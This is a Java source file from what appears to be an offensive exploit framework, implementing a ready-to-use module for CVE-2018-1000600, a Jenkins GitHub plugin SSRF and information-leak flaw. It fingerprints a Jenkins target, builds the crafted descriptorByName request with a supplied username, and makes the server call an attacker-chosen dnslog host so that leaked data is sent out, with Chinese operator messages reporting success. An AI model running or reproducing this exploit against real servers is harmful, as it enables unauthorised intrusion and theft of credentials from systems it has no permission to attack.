package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Jenkins_Info;
import fun.fireline.tools.Response;

import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CVE_2018_1000600 implements ExploitInterface {

    private String exp = "/securityRealm/user/username/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=";

    private String url = "";

    private HashMap<String,String> headers = new HashMap<>();

    private Jenkins_Info jenkins_info = new Jenkins_Info();

    @Override
    public String checkVul(String url) {
        this.url = url;
        String version = jenkins_info.get_Jenkions_Info(url);
        if(version==null){
            return "[-] 目标非Jenkins";
        }
        return "[?] 目标可能存在CVE-2018-1000600 Jenkins GitHub SSRF+信息泄露漏洞,但需要提供用户名和dnslog地址才能验证,请在文件读取/命令执行模块提供用户名和dnslog地址进行验证 eg:user1|http://dnslog.cn or user1|dnslog.cn (username|dnslog.cn)";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String regex = "(.*?)\\|(.*)";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(cmd);
        if (!matcher.matches()) {
            return "命令格式: user1|http://dnslog.cn or user1|dnslog.cn";
        }
        String username = matcher.group(1).trim();
        String dns = matcher.group(2);
        exp = exp.replace("username",username);
        Response response = HttpTools.get(this.url+exp+dns,this.headers,"UTF-8");
        if(response.getCode()==200){
            if(response.getText().contains("Created")){
                return "SSRF成功,请从dnslog接受泄露的信息";
            }
        }
        return "SSRF失败,该目标可能不存在CVE-2018-1000600 Jenkins GitHub SSRF+信息泄露漏洞";
    }


    @Override
    public boolean isVul() {
        return true;
    }
}
